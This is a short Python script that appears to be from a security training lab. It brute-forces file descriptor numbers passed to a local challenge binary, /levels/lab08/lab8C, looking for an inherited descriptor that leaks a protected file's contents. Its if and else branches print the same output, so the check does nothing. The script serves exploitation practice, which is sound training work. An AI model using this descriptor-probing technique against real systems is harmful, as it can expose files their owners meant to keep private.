## Brute force attempt at this challenge with different fd numbers...
import subprocess

likely_output ='"" is lexicographically equivalent to ""'
for i in range(3,10000):
    process = subprocess.Popen(["/levels/lab08/lab8C", "-fn=file1", "-fd=" + str(i)],stdout=subprocess.PIPE) 
    out,err = process.communicate()
    if(likely_output in out):
        print out
    else: 
        print out
